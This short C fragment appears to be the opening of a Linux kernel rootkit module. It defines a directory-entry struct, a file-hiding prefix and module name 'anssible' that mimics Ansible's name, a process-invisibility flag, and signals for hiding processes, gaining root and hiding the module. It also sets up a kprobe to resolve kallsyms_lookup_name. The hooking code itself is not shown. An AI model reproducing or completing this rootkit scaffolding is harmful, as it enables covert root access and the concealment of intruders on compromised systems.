#include <linux/kprobes.h>

struct linux_dirent {
		unsigned long	d_ino;
		unsigned long	d_off;
		unsigned short	d_reclen;
		char			d_name[1];
};

#define MAGIC_PREFIX "anssible"
#define PF_INVISIBLE 0x10000000
#define MODULE_NAME "anssible"

enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};


